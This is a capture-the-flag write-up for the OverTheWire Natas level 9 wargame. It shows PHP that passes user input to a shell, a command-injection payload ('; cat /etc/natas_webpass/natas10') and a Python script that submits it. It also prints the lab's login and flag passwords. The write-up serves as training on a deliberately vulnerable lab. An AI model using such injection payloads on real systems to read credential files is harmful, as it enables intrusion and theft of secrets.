# Natas Level 9 Writeup (natas9) – OverTheWire

## Overview

This level focuses on exploiting a command injection vulnerability in a web application.       
The goal is to find the password for the next level.

## Observation

When we open the page, we see a search functionality where user input is submitted.

There is also a link to view the source code:

```
index-source.html
```

## Finding the Password

### Using Browser
1. Open the source code.
2. It shows the `PHP` logic used:
    ```php
    <?
    if($key != "") {
        passthru("grep -i $key dictionary.txt");
    }
    ?>
    ```
3. Since `$key` is not sanitized, it is vulnerable to command injection.

4. Inject a command using a shell separator:
   ```
   ; cat /etc/natas_webpass/natas10
   ```

5. Submit the payload in the search field.

The server executes the injected command and returns the password.

#### Proof
```text
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

African
Africans
......
```

### Using Python

```python
import requests, re, base64

session = requests.Session()
base_url = "http://natas9.natas.labs.overthewire.org/"
session.auth = ("natas9", "ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t")

# # step 1: Get source code file
# res = session.get(base_url)
# match = re.search(r'<a(.*?)</a>', res.text, re.DOTALL)
# print(match.group(1))

# # step 2: Reveal php logic and $key not sanitized 
# from bs4 import BeautifulSoup  # install with 'pip install bs4'
# url = base_url + "index-source.html"
# res = session.get(url)
# soup = BeautifulSoup(res.text, 'html.parser')
# clean_text = soup.get_text()
# match = re.search(r'<\?(.*?)\?>', clean_text, re.DOTALL)
# print(match.group(1))

# Get flag
payload = "; cat /etc/natas_webpass/natas10"
data = {
    "needle": payload,
    "submit": "Search"
}
res = session.post(base_url, data=data)
match = re.search(r'<pre>\s+(\S+)', res.text)
print(f'Password for next level is: {match.group(1)}')
```

## Vulnerability

User input is directly passed into a system command without proper sanitization, leading to command injection.

## Flag
`t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

